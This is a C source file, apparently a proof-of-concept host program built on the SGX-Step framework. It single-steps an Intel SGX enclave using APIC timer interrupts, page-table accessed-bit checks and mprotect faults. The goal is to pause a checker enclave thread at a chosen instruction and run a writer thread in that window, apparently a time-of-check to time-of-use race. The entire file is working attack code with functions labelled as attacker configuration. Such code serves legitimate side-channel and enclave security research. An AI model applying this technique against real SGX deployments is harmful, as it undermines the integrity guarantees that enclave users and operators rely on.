#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <signal.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include "libsgxstep/apic.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"

sgx_enclave_id_t eid = 0;
uintptr_t baseAddress;

int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
uint64_t *pte_encl = NULL;
uint64_t *pmd_encl = NULL;

int thread2Wait = 1;

void *ecall_checker_thread_address;

pthread_t thread2;
pthread_t thread1;

int stepped = 0;

void aep_cb_func(void) {
	irq_cnt++;

	if(ACCESSED(*pte_encl)) {
		stepped++;
	}
	if (stepped == 192) {
		info("Ecall steps: %d",stepped);
		do_irq = 0;
		ASSERT(!mprotect((void *) ecall_checker_thread_address, 4096, PROT_NONE));
	}

	*pte_encl = MARK_NOT_ACCESSED( *pte_encl );

	if (do_irq) {
	*pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
	apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
	}
}

void attacker_config_runtime(void) {
	ASSERT( !claim_cpu(VICTIM_CPU) );
	ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );

	register_aep_cb(aep_cb_func);
	register_enclave_info();
	print_enclave_info();
}

void attacker_config_page_table(void) {
	info("enclave trigger code adrs at %p\n", ecall_checker_thread_address);
	ASSERT( pte_encl = remap_page_table_level( (void *) ecall_checker_thread_address, PTE) );

	ASSERT(!mprotect((void *) ecall_checker_thread_address, 4096, PROT_NONE));

	ASSERT( pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
}

void fault_handler(void *base_adrs) {
	if(base_adrs == ecall_checker_thread_address) {
		ASSERT(!mprotect((void *)ecall_checker_thread_address, 4096, PROT_READ | PROT_WRITE));
		if(fault_cnt == 1) {
			thread2Wait = 0;
			info("Joining thread2");
			pthread_join(thread2,NULL);
			info("1 free");
			return;
		}
		fault_cnt++;
	}

}

void ocall_print_string(const char *str) {
	printf("Enclave print: %s\n", str);
}

void *thread2Func(void* args) {
	info("2 created: %d", pthread_self());
	while(thread2Wait) {sleep(1);}
	info("2 out");
	SGX_ASSERT(ecall_writer_thread(eid));
	info("2 done");
}

void *thread1Func(void* args) {
	SGX_ASSERT(ecall_setup(eid));
	
	attacker_config_runtime();
	attacker_config_page_table();

	idt_t idt = {0};
	info_event("Establishing user-space APIC/IDT mappings");
	map_idt(&idt);
	install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
	apic_timer_oneshot(IRQ_VECTOR);
	info("1 created: %d", pthread_self());
	SGX_ASSERT(ecall_checker_thread(eid, NULL));
}

int main( int argc, char **argv) {
	sgx_launch_token_t token = {0};
	int updated = 0;
	
	info_event("Creating enclave...");
	SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", 1, &token, &updated, &eid, NULL));

	baseAddress = (uintptr_t) get_enclave_base();
	info("Enclave at %p\n", baseAddress);
	register_fault_handler(fault_handler);
	ecall_checker_thread_address = baseAddress + (4244/4096)*4096;

	pthread_create(&thread2, NULL,thread2Func, NULL);
	pthread_create(&thread1, NULL,thread1Func, NULL);

	pthread_join(thread1,NULL);

	apic_timer_deadline();
	SGX_ASSERT( sgx_destroy_enclave( eid ) );
	info("all is well; exiting..");
	return 0;
}
